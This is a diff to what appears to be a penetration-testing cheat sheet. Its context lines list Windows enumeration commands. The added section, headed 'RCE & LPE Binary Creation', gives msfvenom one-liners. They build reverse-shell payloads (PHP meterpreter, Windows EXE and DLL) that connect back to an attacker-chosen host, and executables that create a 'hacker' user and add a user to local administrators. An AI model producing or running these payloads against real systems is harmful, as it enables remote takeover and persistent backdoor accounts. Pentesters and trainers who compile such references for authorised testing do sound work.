@@ -74,6 +74,18 @@ schtasks /query /fo LIST /v
 "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select Displayname
 Get-CimInstance -Class win32_quickfixengineering | Where-Object { $_.Description -eq "Security Update" }
 ```
-## RCE & LPE Binary Creation
 
 ## Password Bruting
+```bash
+```
+
+## Misc
+
+###RCE & LPE Binary Creation
+```bash
+msfvenom -p php/meterpreter_reverse_tcp LHOST=<Your_IP> LPORT=<Your_Port> -f raw > shell.php
+msfvenom -p windows/shell_reverse_tcp LHOST=<Your_IP> LPORT=<Your_Port> -f exe > shell.exe
+msfvenom -p windows/shell_reverse_tcp LHOST=<Your_IP> LPORT=<Your_Port> -f dll > shell.dll
+msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe > addadmin.exe
+msfvenom -p windows/adduser USER=hacker PASS=ComplexP@ssw0rd! -f exe > adduser.exe
+```
